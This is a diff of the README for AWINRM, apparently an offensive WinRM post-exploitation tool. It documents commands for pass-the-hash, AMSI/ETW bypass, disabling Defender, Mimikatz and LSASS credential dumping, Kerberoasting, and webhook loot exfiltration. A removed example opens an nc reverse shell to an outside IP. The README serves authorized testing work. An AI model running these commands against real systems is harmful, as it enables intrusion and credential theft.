@@ -1,380 +1,336 @@
----
----
+# AWINRM
 
-<!--
-AWINRM, WinRM hacking, Evil-WinRM alternative, Windows remote management exploitation,
-Active Directory post-exploitation automation, AMSI bypass tool, ETW bypass winrm,
-Lateral movement over WinRM, payload staging automation Windows, SOCKS proxy pivoting,
-CTF Active Directory exploitation, credential extraction Windows pentest,
-Privilege escalation Windows red team, advanced WinRM shell Ruby,
-WinRM file uploader large objects, IPv6 lateral movement pentest,
-Kerberos attacks, NTLM hash pass, BloodHound automation, Mimikatz staging winrm,
-Defender evasion Windows Server 2019 and 2022, operational security automation,
-Adversary emulation framework, offensive security research and education only,
-Authorized penetration testing tooling, HackTheBox pro labs winrm use case
--->
+**Advanced WinRM Shell for CTFs, Red Teams, and Offensive Research**
 
-# AWINRM  
-Advanced WinRM Shell for CTFs, Red Teams, and Offensive Research
-AWINRM is an operator focused WinRM framework under active development.
-Features, macros, and internal behavior may evolve as the tool matures.
+AWINRM is an operator-focused WinRM post-exploitation framework written in Ruby — an alternative to [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) with built-in tool staging, macro workflows, AMSI/ETW bypass automation, stealth file transfer, and automatic loot extraction.
 
 ![status: alpha](https://img.shields.io/badge/status-alpha-orange)
-![stability: experimental](https://img.shields.io/badge/stability-experimental-red)
 ![license: MIT](https://img.shields.io/badge/license-MIT-blue)
-![tech: WinRM](https://img.shields.io/badge/tech-WinRM-darkgreen)
-![ruby version](https://img.shields.io/badge/Ruby-3.0+%20required-CC342D)
-![platform support](https://img.shields.io/badge/Windows%20Target-Win10%2F11%20%7C%20Server%202016--2022-important)
+![ruby version](https://img.shields.io/badge/Ruby-3.0%2B-CC342D)
 ![protocol: winrm](https://img.shields.io/badge/Protocol-WinRM%20(HTTPS%20Preferred)-informational)
 ![mitre mapped](https://img.shields.io/badge/MITRE%20ATT&CK-Mapped%20Techniques-blueviolet)
-![osint safe](https://img.shields.io/badge/OPSEC-Stage%20in%20memory%20(no%20disk)-lightgrey)
-![artifact control](https://img.shields.io/badge/Loot-Auto%20extraction%20enabled-green)
-![ctf optimized](https://img.shields.io/badge/Mode-CTF%20Optimized-brightgreen)
 
-
-> Alpha release — experimental automation modules.  
-> Use only where you have **explicit written authorization**.
+> **Alpha software — use only where you have explicit written authorization.**
+> See [Legal and Ethical Notice](#legal-and-ethical-notice).
 
 ```
  █████╗ ██╗    ██╗██╗███╗   ██╗██████╗ ███╗   ███╗
-██╔══██╗██║    ██║██║████╗  ██║██╔══██╗████╗ ████║
-███████║██║ █╗ ██║██║██╔██╗ ██║██████╔╝██╔████╔██║
-██╔══██║██║███╗██║██║██║╚██╗██║██╔══██╗██║╚██╔╝██║
-██║  ██║╚███╔███╔╝██║██║ ╚████║██║  ██║██║ ╚═╝ ██║
-╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝
+ ██╔══██╗██║    ██║██║████╗  ██║██╔══██╗████╗ ████║
+ ███████║██║ █╗ ██║██║██╔██╗ ██║██████╔╝██╔████╔██║
+ ██╔══██║██║███╗██║██║██║╚██╗██║██╔══██╗██║╚██╔╝██║
+ ██║  ██║╚███╔███╔╝██║██║ ╚████║██║  ██║██║ ╚═╝ ██║
+ ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝
 
-                   AWINRM OPERATOR SHELL
-```
----
-
-## Background and Purpose
-
-AWINRM was built from real operator struggles inside enterprise Active Directory environments.  
-While traditional WinRM tooling works, real redteam operations face friction:
-
-- Broken or slow uploads for large binaries  
-- In memory execution blocked by AMSI/ETW  
-- Instability around PowerShell language modes  
-- Weak automation for enumeration and credential gathering  
-- IPv6 lateral movement poorly supported  
-- Repetitive staging steps harming OPSEC  
-
-AWINRM directly addresses these issues through its operator centric workflow system, staging subsystem, and built-in bypass modules.
-
-Designed for:
-
-- CTF challenge assault paths (Kerberoast → lateral movement → LSASS access)
-- HTB Pro Labs enterprise engagements
-- High fidelity red-team simulations
-
----
-
-## Key Features Summary
-
-- Automated AMSI bypass and ETW disruption  
-- Reliable file staging for large binaries  
-- Architecture-aware tooling (x86/x64)
-- Command macros for AD recon and exploitation  
-- SOCKS proxy tunneling for pivot operations  
-- Auto-loot heuristics for credentials, flags, tokens  
-- Optional banner-based situational awareness  
-- Stealth upload mode with ADS storage support  
-- Built-in IPv6 probing and fallback support  
-- Workflow persistence and command history logging  
-
-Output is stored locally in the **loot/** directory for offline analysis.
-
----
-
-## Banner System
-
-AWINRM features two situational awareness modes:
-
-Minimal banner (default):  
-• Fast execution in CTF environments  
-• Summarizes privileges, EDR state, local flags  
-
-Expand banner mode:  
-Provides high depth assessment including:
-
-- Live SQL/MSSQL instance detection  
-- Kerberos misconfiguration checks  
-- Patch state indicators  
-- Lateral movement suggestions  
-- Trust relationship scan summary  
-- Privilege escalation scoring  
-
-Run expanded banner like this:
-```bash
-
-ruby bin/evil-ctf.rb -i 10.10.10.10 -u Administrator -p Passw0rd! --banner expanded
-```
-Operators receive active decision guidance for next-step exploitation.
-
----
-
-## AMSI and ETW Bypass Automation
-
-AWINRM provides automated in memory defenses against common blue-team controls:
-
-- AMSI bypass using runtime patching
-- ETW neutralization against script tracing
-- Avoids touching disk or modifying registry
-- Supports fallback manual execution
-- Updated for modern Windows 10 / Windows Server builds
-
-Execution can be toggled or invoked by operator preference.
-
----
-
-## Tool Auto Staging System
-
-Automatically deploys common offensive tools for credential harvesting, domain enumeration, and privilege escalation.
-
-Supported tool families:
-
-- SharpHound  
-- Rubeus  
-- PowerView / PowerSploit modules  
-- Mimikatz  
-- WinPEAS  
-- Seatbelt  
-- Inveigh  
-- ProcDump  
-- RunasCs  
-- SSH / tunneling helpers  
-- Nishang scripts  
-### Using RunasCs
-
-RunasCs is a C# implementation of RunAs for user impersonation and UAC bypass. After staging RunasCs.exe to the remote host, you can use it as follows:
-
-**Spawn Process with Network Credentials:**
-```powershell
-.\RunasCs.exe -d domain.tld -l 8 'username' 'password' 'C:\Windows\Temp\nc.exe 10.6.6.6 443 -e powershell.exe'
+                    AWINRM OPERATOR SHELL
 ```
 
-**Spawn Process with Logon:**
-```powershell
-.\RunasCs.exe username_here password_here powershell.exe -r RHOST:RPORT
-```
+## Why AWINRM
 
-See the [RunasCs GitHub](https://github.com/antonioCoco/RunasCs) for more usage details and options.
+Traditional WinRM tooling works, but real operations run into friction:
 
-Features:
+- Broken or slow uploads for large binaries
+- In-memory execution blocked by AMSI/ETW
+- Instability around PowerShell language modes
+- Manual, repetitive staging that harms OPSEC
+- Weak automation for enumeration and credential gathering
+- Poor IPv6 lateral-movement support
 
-- Architecture aware staging
-- Chunked or XOR-encoded uploads
-- Alternate Data Stream support
-- Randomized filenames for OPSEC
-- Tool registry with version mapping
+AWINRM addresses these with an operator-centric workflow: connect → situational banner → automatic bypasses → staged tooling → macro-driven recon/dumping → auto-extracted loot.
 
-Artifacts stored in:
+## Requirements
 
-loot/creds.json  
-loot/loot.txt  
+- **Ruby 3.0+** (developed on 3.3; CI runs 3.2; the rubocop config targets Ruby 4.0 compatibility)
+- **Bundler**
+- Network access to the target's WinRM endpoint (5985 HTTP / 5986 HTTPS)
 
----
-
-## Reconnaissance and Attack Macros
-
-Streamlined workflows to accelerate exploitation:
-
-- Kerberoasting automation
-- Domain recon bundles
-- Credential and token dumping
-- LSASS extraction and secure download
-- SharpHound collection
-- SOCKS tunneling initialization
-- Local and domain privilege assessment
-- Automated discovery of lateral access paths
-
-Designed for both rapid CTF wins and full domain takeover scenarios.
-
----
 ## Installation
 
-AWINRM requires **Ruby 3.0+** and **Bundler**.
-
 ```bash
+git clone https://github.com/ridpath/awinrm.git
+cd awinrm
 bundle install
 ```
 
-### Gemfile
+All runtime dependencies are declared in the [Gemfile](Gemfile) (`winrm`, `winrm-fs`, `concurrent-ruby`, `ffi`, `gssapi`, `logging`, `nori`, `ostruct`, `readline`, `rubyzip`, `socksify`, `syslog`, `colorize`, plus test/dev gems).
 
-```
-# Gemfile (updated for Ruby 3.2+)
+### Entry points
 
-source 'https://rubygems.org'
+Any of the following start the same CLI:
 
-gem 'winrm', '~> 2.3.9'          # WinRM client, fully compatible with Ruby 3.x
-gem 'socksify', '~> 1.8.1'       # TCP‑Socks proxy support
-gem 'concurrent-ruby', '~> 1.2.0'
-gem 'net-smtp', '~> 0.3.4'
-gem 'rubyzip', '~> 2.0'
-
-# Bundler itself
-gem 'bundler', '~> 2.4.0'
-
-```
-
-Ruby’s standard library covers the remaining imports (optparse, ipaddr, socket, fileutils, etc.).
-
----
-
-
-## Usage Guide
-
-
-### Basic Authentication
 ```bash
-ruby bin/evil-ctf.rb -i <target_ip> -u <username> -p <password>
+ruby bin/evil-ctf.rb --help     # canonical entry point
+./evil-ctf --help               # wrapper (uses bundle exec automatically)
+ruby evil-ctf.rb --help         # root-level shim
 ```
 
-### IPv6 Connections
-AWINRM supports direct connections to Windows hosts over IPv6. For reliable IPv6 connectivity, follow these steps:
+## Quick Start
 
-1. **Map IPv6 Address to Hostname**
-    Add the IPv6 address and desired hostname to `/etc/hosts` using the built-in CLI option:
-    ```bash
-    sudo ruby evil-ctf.rb --ipv6 <IPv6_address>,<hostname>
-    # Example:
-    sudo ruby evil-ctf.rb --ipv6 fd00:1234:5678::10,Old-W10
-    ```
-    This will append a line to `/etc/hosts` mapping the IPv6 address to the hostname (with backup and idempotency).
-
-2. **Connect Using the Hostname**
-    After mapping, connect to the target using the hostname:
-    ```bash
-    ruby evil-ctf.rb -i Old-W10 -u <username> -p <password>
-    ```
-    AWINRM will resolve the hostname to the IPv6 address and connect over IPv6 if the target is listening.
-
-3. **Verifying IPv6 Connection**
-    - On the Windows target, run:
-      - `netstat -an | findstr 5985` or
-      - `Get-NetTCPConnection | Where-Object { $_.LocalPort -eq 5985 }`
-      and look for connections from your Linux IPv6 address.
-    - On Linux, run:
-      - `ss -6 dst <IPv6_address>`
-      - `netstat -an | grep <IPv6_address>`
-      during the connection attempt.
-
-**Notes:**
-- If you use a zone index (e.g., `fd00:1234:5678::10%enp130s0`), only the address part is mapped in `/etc/hosts`.
-- You can repeat the mapping for multiple hosts as needed.
-
-
-### Pass-the-Hash
 ```bash
-ruby evil-ctf.rb -i HOST -u USER -H NTLM_HASH
+# Basic authentication
+./evil-ctf -i 10.10.10.10 -u Administrator -p Welcome1!
+
+# Pass-the-Hash (NTLM)
+./evil-ctf -i 10.10.10.10 -u Administrator -H aad3b435b51404eeaad3b435b51404ee
+
+# TLS / HTTPS (port 5986 by default with --ssl)
+./evil-ctf -i 10.10.10.10 --ssl -u Administrator -p Welcome1!
+
+# Kerberos
+./evil-ctf -i 10.10.10.10 -u administrator -k --realm DOMAIN --keytab admin.keytab
+
+# Load a saved profile
+./evil-ctf --profile default
+
+# List the tool catalog without connecting
+./evil-ctf --list-tools
 ```
 
-### TLS Encrypted Transport
+## CLI Reference
+
+| Flag | Description |
+|------|-------------|
+| `-i, --ip IP` | Target IP / hostname |
+| `-u, --username USERNAME` | Username |
+| `-p, --password PASSWORD` | Password |
+| `-H, --hash HASH` | NTLM hash (pass-the-hash) |
+| `-k, --kerberos` | Use Kerberos authentication |
+| `--realm REALM` | Kerberos realm |
+| `--keytab FILE` | Kerberos keytab |
+| `--port PORT` | Port (default: 5985, or 5986 with `--ssl`) |
+| `--ssl` | Use HTTPS transport |
+| `--hosts FILE` | Multi-host file for campaign execution |
+| `--ipv6 IP,HOSTNAME` | Map IPv6 address to hostname in `/etc/hosts` (requires sudo) |
+| `--socks HOST:PORT` | Route the session through a SOCKS proxy |
+| `--profile NAME` | Load a profile from `profiles/*.yaml` or `config/profiles.yaml` |
+| `--banner MODE` | Situational banner: `minimal` (default) or `expanded` |
+| `--tui` | Launch the interactive TTY-based dashboard UI |
+| `--stealth` | ADS staging + random filenames |
+| `--xor-key KEY` | XOR-encode staged uploads (hex or decimal key) |
+| `--random-names` | Randomize remote filenames |
+| `--auto-evasion` | Auto-disable Defender real-time protection on connect |
+| `--auto-exec` | Auto-execute staged tools after staging |
+| `--beacon` | Insert a sleep delay between remote commands (lower activity rate) |
+| `--webhook URL` | POST extracted loot to a webhook |
+| `--log FILE` | Append command output to a file |
+| `--log-session` | Enable structured session logging under `log/` |
+| `--enum TYPE` | Run an enumeration preset on connect (`basic`, `deep`, `sql`, …) |
+| `--fresh` | Bypass the enumeration cache |
+| `--user-agent AGENT` | Custom User-Agent for WinRM HTTP requests |
+| `--no-verify` | Skip connection validation |
+| `--list-tools` | Print the tool catalog and exit |
+| `--debug` | Pass `debug: true` to the WinRM client |
+| `-h, --help` | Show help |
+
+## The Interactive Shell
+
+On connect, AWINRM runs the optional banner, applies configured bypasses, and drops you into a prompt. Anything that is not a built-in command is expanded (macro → alias) and sent to the remote as PowerShell.
+
+### Built-in commands
+
+| Command | Description |
+|---------|-------------|
+| `help` | Show this command reference |
+| `clear` | Clear the screen |
+| `tools` | List the dynamic tool registry |
+| `tool <name>` / `tool all` | Stage one tool / stage all available tools |
+| `download_missing` | Download all missing tools into `./tools` |
+| `fileops` | File operations menu (upload / download / ZIP) |
+| `enum [type]` | Run an enumeration preset (`basic`, `deep`, `sql`, …) |
+| `dump_creds` | Stage Mimikatz and dump logon passwords |
+| `lsass_dump` | Stage ProcDump and dump LSASS into `./loot` |
+| `bypass-4msi` | Apply the AMSI bypass |
+| `bypass-etw` | Apply the full ETW bypass |
+| `disable_defender` | Disable Defender real-time protection |
+| `get-unquotedservices` | List unquoted service paths (privesc check) |
+| `load_ps1 <local.ps1>` | Upload and dot-source a local PowerShell script |
+| `invoke-binary <local.bin> [args]` | Upload and execute a local binary |
+| `services` / `processes` / `sysinfo` | Remote service / process / system info |
+| `history` / `history clear` | Show or clear command history |
+| `validate macros [names...]` | Statically validate macros without executing |
+| `validate aliases [names...]` | Statically validate aliases without executing |
+| `profile save <name>` | Save the current options as a profile |
+| `!sh` / `!bash` | Spawn a local shell |
+| `exit` / `quit` | Close the session |
+
+### Shell aliases
+
+`ls`/`dir` → `Get-ChildItem`, `ps` → `Get-Process`, `whoami` → `$env:USERNAME`, `pwd` → `Get-Location`, `cd` → `Set-Location`, `rm` → `Remove-Item`, `cat` → `Get-Content`, `mkdir` → `New-Item`, `cp`/`mv` → `Copy-Item`/`Move-Item`.
+
+### Macros
+
+Macros are multi-step workflows (bypass → stage → execute). Type the macro name at the prompt; required tools are staged automatically.
+
+| Macro | Does | Stages |
+|-------|------|--------|
+| `dump_creds` | Mimikatz `sekurlsa::logonpasswords` | mimikatz |
+| `cred_harvest` | Mimikatz logonpasswords + `lsadump::sam` | mimikatz |
+| `lsass_dump` | ProcDump LSASS to `C:\Users\Public` | procdump |
+| `kerberoast` | Rubeus `kerberoast` with hash output file | rubeus |
+| `rubeus_klist` | Rubeus `klist` (ticket cache) | rubeus |
+| `sharphound_all` | SharpHound `-c all` | sharphound |
+| `seatbelt_all` | Seatbelt `-group=all` | seatbelt |
+| `dom_enum` / `powerview_all` | PowerView domain enumeration | powerview |
+| `inveigh_start` | Start Inveigh spoofing | inveigh |
+| `socks_init` | Invoke-SocksProxy bind on port 1080 | socksproxy |
+| `nishang_rev` | Nishang reverse connection | nishang |
+| `invoke-mimikatz` | PowerSploit `Invoke-Mimikatz` | — |
+| `bypass-4msi` / `bypass-etw` | Standalone bypass primitives | — |
+
+Macros support placeholder substitution (`[AttackerIP]`, `[AttackerPort]`, `[NishangRevRemote]`, `[InveighRemote]`) — see `validate macros --attacker-ip/--attacker-port` for static checks.
+
+## Situational Banner
+
+**Minimal** (default) — fast CTF-mode summary: user, privileges (potato-attack indicators), EDR/Defender state, local flags.
+
+**Expanded** — deeper assessment: patch level, Kerberos misconfiguration signals, SQL instance discovery, lateral-movement suggestions, privilege-escalation scoring:
+
 ```bash
-ruby evil-ctf.rb -i HOST --ssl -u USER -p PASS
+./evil-ctf -i 10.10.10.10 -u user -p Pass --banner expanded
 ```
 
-### SOCKS Proxy Pivot
-```bash
-ruby evil-ctf.rb -i HOST --socks 127.0.0.1:1080 -u USER -p PASS
-```
+Pass `--tui` to get the full interactive dashboard (menu-driven, live upload progress, command queue) instead of the readline prompt.
 
-### Staging and Recon Macros
-```bash
-tool all
-dump_creds
-dom_enum
-```
+## Bypass Automation
 
----
+- **AMSI** — in-memory patching (`bypass-4msi` / `--auto-evasion` paths), no disk or registry changes
+- **ETW** — script-tracing neutralization (`bypass-etw`)
+- **Defender** — optional real-time protection disable on connect (`--auto-evasion` / `disable_defender`)
 
-## Uploading to Alternate Data Streams (ADS)
+Macro workflows apply the relevant bypasses automatically before tool execution.
 
-EvilCTF supports uploading files directly to Windows Alternate Data Streams (ADS) for stealth and OPSEC. This allows you to store data in hidden streams attached to files.
+## Tool Staging
 
-#### How to Upload to an ADS
-1. **Start a session:**
-    ```bash
-    ruby evil-ctf.rb -i <target_ip> -u <username> -p <password>
-    ```
-2. **Enter the file operations menu:**
-    ```
-    fileops
-    ```
-3. **Choose "Upload file" and specify your local file.**
-4. **For the remote destination, use the format:**
-    ```
-    C:\Users\Public\target.txt:adsname
-    ```
-    This uploads your file into the ADS named `adsname` attached to `target.txt`.
+Built-in catalog (see `--list-tools` for the live list):
 
-#### Verifying the ADS Upload
-On the target system, use PowerShell:
+- **Recon** — SharpHound, PowerView, Seatbelt, Nishang
+- **Privilege** — Mimikatz, Rubeus, Inveigh, ProcDump, WinPEAS, Invoke-Mimikatz
+- **Pivot** — Invoke-SocksProxy, Plink, EDR-Redir V2
+
+Staging features:
+
+- Architecture-aware selection (x86/x64)
+- Chunked and XOR-encoded uploads for large binaries
+- Alternate Data Stream storage (`--stealth`)
+- Randomized remote filenames (`--random-names` / `--stealth`)
+- Tool registry with metadata sidecars (`tools/**/*.yml`) and version mapping
+
+Missing tools download into `./tools` via `download_missing`.
+
+## File Transfer & Alternate Data Streams
+
+Use the `fileops` menu inside a session for upload / download / ZIP operations. The chunked uploader (`lib/evil_ctf/uploader`) is built for large objects over WinRM, with an SMB fallback path where available.
+
+**Stealth upload via ADS** — store payloads in a hidden stream attached to an existing file:
+
+1. From the `fileops` menu, choose **Upload file**.
+2. For the remote destination use the form `C:\Users\Public\target.txt:adsname`.
+3. Verify on the target:
+
 ```powershell
 Get-Content -Path 'C:\Users\Public\target.txt:adsname'
-```
-For binary files:
-```powershell
 [System.IO.File]::ReadAllBytes('C:\Users\Public\target.txt:adsname')
 ```
-Or download the ADS using EvilCTF by specifying the full ADS path in the fileops menu.
 
-> **Note:** The base file (e.g., `target.txt`) must exist before uploading to its ADS.
+> The base file must exist before uploading to its ADS. ADS paths can also be downloaded through `fileops`.
 
+## Loot System
 
-Basic authentication:  
-```bash
-ruby bin/evil-ctf.rb -i 10.10.10.10 -u Administrator -p Welcome1!
-```
-Pass-the-Hash:  
-```bash
-ruby evil-ctf.rb -i HOST -u USER -H NTLM_HASH)
-```
-TLS encrypted transport:  
-```bash
-ruby evil-ctf.rb -i HOST --ssl -u USER -p PASS)
-```
-SOCKS proxy pivot:  
-```bash
-ruby evil-ctf.rb -i HOST --socks 127.0.0.1:1080 -u USER -p PASS)
-```
-Execute staging macro:  
-```bash
-tool all
-```
-Dump credentials:  
-```bash
-dump_creds
-```
-Domain reconnaissance:  
-```bash
-dom_enum
-```
-Operators can chain execution across multiple remote hosts for campaign automation.
+Extraction is automatic: credential patterns, flags, and tokens are scanned from command output as you work.
 
----
+- `loot/loot.txt` — plain-text matches (append-only)
+- `loot/creds.json` — structured credential JSON (deduplicated)
+- `--webhook URL` — POST loot to a webhook in real time
+- `--log FILE` / `--log-session` — command output and structured session logs
+
+## IPv6 Lateral Movement
+
+1. Map the address to a hostname (requires sudo; backs up `/etc/hosts`, idempotent):
+
+```bash
+sudo ./evil-ctf --ipv6 fd00:1234:5678::10,Old-W10
+```
+
+2. Connect using the hostname:
+
+```bash
+./evil-ctf -i Old-W10 -u user -p Pass
+```
+
+3. Verify: on the target, `Get-NetTCPConnection | Where-Object { $_.LocalPort -eq 5985 }`; on your box, `ss -6 dst fd00:1234:5678::10`.
+
+Zone indexes (`fd00::10%enp130s0`) are stripped before the hosts-file mapping. Repeat `--ipv6` for additional hosts.
+
+## Profiles
+
+Profiles save connection + behavior options as YAML:
+
+- Built-in: `config/profiles.yaml`
+- User: `profiles/*.yaml` (gitignored — keep credentials out of the repo)
+
+```bash
+./evil-ctf --profile default             # load from the CLI (built-in or user profile)
+profile save mylab                       # save current options from the shell
+```
+
+Only safe keys are persisted (secrets like `:password`/`:hash` and runtime objects are excluded).
 
 ## Project Structure
 
-AWINRM  
-bin/evil-ctf.rb          CLI entry point  
-lib/evil_ctf/banner.rb   Banner and recon information  
-lib/evil_ctf/enums.rb    Enumeration systems  
-lib/evil_ctf/session.rb  Interactive shell and workflow engine  
-lib/evil_ctf/tools.rb    Tool registry and auto staging rules  
-lib/evil_ctf/uploader.rb File transfer implementation  
-loot/                    Local credential and artifact storage  
-profiles/                YAML configuration for stealth workflows  
-README.md                Framework documentation  
-LICENSE                  Legal terms  
+```
+awinrm/
+├── bin/evil-ctf.rb            # CLI entry point
+├── evil-ctf                   # bash wrapper (bundle exec)
+├── evil-ctf.rb                # root-level shim
+├── Gemfile / Gemfile.lock
+├── .rubocop.yml               # lint config (TargetRubyVersion 4.0)
+├── config/profiles.yaml       # built-in profiles
+├── lib/
+│   ├── config/profiles.rb     # profile load/save (safe YAML)
+│   └── evil_ctf/
+│       ├── cli.rb             # option parsing, validation, dispatch
+│       ├── session.rb         # session engine (bootstrap/loop split out)
+│       ├── session/           # bootstrap, interactive_loop, runtime_setup,
+│       │                      # log_channels, command_history, session_logger
+│       ├── command_dispatcher.rb  # handler-based built-in commands
+│       ├── connection.rb      # WinRM connection + validation
+│       ├── shell_adapter.rb   # shell abstraction (upload/close/…)
+│       ├── execution.rb       # remote job execution + streaming
+│       ├── uploader.rb        # chunked uploader (+ smb fallback, client)
+│       ├── tools.rb           # tool registry facade + staging rules
+│       ├── tools/             # stager, downloader, macro_engine, alias_engine,
+│       │                      # loot_scanner, loot_store, crypto, …
+│       ├── banner.rb          # situational awareness banner
+│       ├── tui.rb             # interactive TTY dashboard
+│       ├── enums.rb           # enumeration presets
+│       ├── sql_enum.rb        # MSSQL discovery
+│       ├── crypto.rb          # XOR codec
+│       ├── sanitizer.rb       # input sanitization
+│       └── …                  # logger, errors, utils, app_state, async_worker
+├── tools/                     # staged tool binaries + metadata sidecars
+├── scripts/                   # dev/demo scripts (mock TUI, banner tests)
+├── spec/                      # RSpec suite (170 examples)
+└── docs/
+    ├── architecture.md        # component architecture
+    └── todo.md                # project source of truth (roadmap/status)
+```
 
----
+## Development
+
+```bash
+bundle install
+bundle exec rspec       # unit + component specs
+bundle exec rubocop     # lint (also runs in CI)
+```
+
+CI (`.github/workflows/ci.yml`) runs three jobs: **lint** (rubocop), **unit-tests** (rspec on push/PR), and a gated **integration-tests** job (`AWINRM_INTEGRATION=1`).
+
+Design docs live in `docs/architecture.md`; the project roadmap and status are tracked in `docs/todo.md`.
 
 ## MITRE ATT&CK Mapping
 
 | Tactic | Technique | ID | Purpose in AWINRM |
-|--------|-----------|----|-----------------|
-| Execution | PowerShell | T1059.001 | Remote in memory command execution |
+|--------|-----------|----|-------------------|
+| Execution | PowerShell | T1059.001 | Remote in-memory command execution |
 | Execution | In-Memory Execution | T1620 | Run payloads without touching disk |
 | Lateral Movement | WinRM | T1021.006 | Movement across Active Directory hosts |
 | Credential Access | Credential Dumping | T1003 | Extract stored secrets for escalation |
@@ -383,97 +339,33 @@ LICENSE                  Legal terms
 | Credential Access | Kerberoasting | T1558.003 | Harvest TGS tickets for offline cracking |
 | Discovery | Account Discovery | T1087 | Identify exploitable users and roles |
 | Discovery | Network/Host Discovery | T1016 | Identify lateral access opportunities |
-| Command and Control | Application Protocol: HTTPS | T1071.001 | Covert, encrypted operator traffic |
-| Defense Evasion | AMSI Bypass | T1562.001 | Block script scanning and signature checks |
-| Defense Evasion | ETW Disable | T1562.002 | Prevent telemetry capture/analysis |
+| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | Encrypted operator traffic over HTTPS |
+| Defense Evasion | Impair Defenses: Disable or Modify Tools | T1562.001 | AMSI bypass / Defender disable |
+| Defense Evasion | Impair Defenses: Disable or Modify Tools | T1562.001 | ETW neutralization (script tracing) |
 
----
+## Acknowledgements
+
+AWINRM builds on the WinRM interaction model established by [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), adding modular tooling, macro workflows, bypass automation, and operator-focused enhancements. Credit to:
+
+- Evil-WinRM authors
+- BloodHound / SharpHound developers
+- GhostPack maintainers
+- PowerShellMafia (PowerView / PowerSploit)
+- Inveigh and Nishang maintainers
+- Sysinternals (ProcDump)
+- [RunasCs](https://github.com/antonioCoco/RunasCs) (staged as a tool)
 
 ## Contribution Policy
 
-Enhancements are welcome on:
-  
-- stealth workflow automation  
-- advanced credential extraction techniques  
-- stability enhancements
-- tools to be autostaged 
+PRs are welcome on:
 
-All pull requests must include full documentation and test coverage.
+- Stealth workflow automation
+- New auto-staged tools and macros
+- Stability and performance fixes
+- Test coverage for untested critical paths
 
----
+All pull requests should pass `bundle exec rspec` and `bundle exec rubocop` and include documentation updates.
 
-<!--
-AWINRM Hidden SEO Footer Block  
-Keywords: AWINRM, Advanced WinRM Shell, WinRM post-exploitation, Active Directory exploitation, credential dumping automation, Kerberoasting toolkit, Ruby WinRM client, LSASS dumping, red team operations tool, Windows lateral movement automation, bypass AMSI ETW, HackTheBox Pro Labs tools, stealth file staging, SOCKS pivot Windows, offensive security automation, domain privilege escalation research  
-This comment is intentionally hidden from README rendering.
--->
-## Acknowledgements
-
-AWINRM draws initial inspiration from the WinRM interface established by  
-[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) by @Hackplayers.
-
-This project expands upon the baseline WinRM interaction model, adding modular tooling, macro workflows, AMSI/ETW bypass automation, and operator-focused enhancements.
-
-Credit is due to:
-
-- Original Evil-WinRM authors  
-- BloodHound / SharpHound developers  
-- GhostPack maintainers  
-- PowerShellMafia (PowerView/PowerSploit)  
-- Inveigh and Nishang maintainers  
-- Sysinternals (ProcDump)
-
----
 ## Legal and Ethical Notice
 
-AWINRM is provided strictly for:
-
-- authorized penetration testing  
-- approved red-team missions  
-- CTF participation  
-- security improvement research  
-
-Unauthorized deployment on systems without explicit permission is illegal.
-
-All responsibility for ethical and lawful use lies solely with the operator.
-
-
-<!--
-AWINRM Offensive Security Framework SEO Footer
-Do not remove - Invisible Ranking Enhancer
-
-Primary Keywords:
-AWINRM, WinRM post exploitation framework, Advanced WinRM shell,
-Windows Remote Management command shell, Evil-WinRM alternative,
-Active Directory exploitation toolkit, AD lateral movement automation,
-Windows credential dumping automation, Kerberoasting automation,
-Pass-the-hash tooling Ruby, LSASS extraction pentest tool,
-PowerShell AMSI bypass, ETW event tracing bypass,
-HTB WinRM exploitation, CTF red team automation,
-Operational security stealth uploads, file staging Windows,
-IPv6 lateral movement tool, SOCKS pivot Windows,
-OpSec safe Windows pentesting tool, enterprise red teaming operations,
-Unauthorized use prohibited, security research and ethical hacking only
-
-Secondary Keywords:
-BloodHound automation WinRM, token extraction Windows, payload delivery Windows,
-Rubeus auto staging, Mimikatz automation tool, Inveigh tooling WinRM,
-PowerView enumeration automation, SeImpersonate privilege escalation,
-Windows Server 2016 2019 2022 exploitation tools,
-Blue team evasion, adversary emulation tooling, Ruby offensive tooling
-
-Search Intent Targeting:
-active directory shell tool
-how to bypass AMSI WinRM
-WinRM upload large files fails solution
-pass the hash winrm ruby
-ETW bypass powershell invoke
-AD lateral movement winrm tools
-CTF HackTheBox winrm vulnerable machines
-HTB RastaLabs winrm post exploitation automation
-
-Legal:
-Educational use only, cyber ranges, explicit authorization required,
-Operator assumes all legal and ethical responsibility.
--->
-
+AWINRM is provided strictly for **authorized penetration testing, approved red-team engagements, CTF participation, and security research**. Unauthorized use on systems you do not own or lack explicit permission to test is illegal. All responsibility for lawful use lies with the operator.
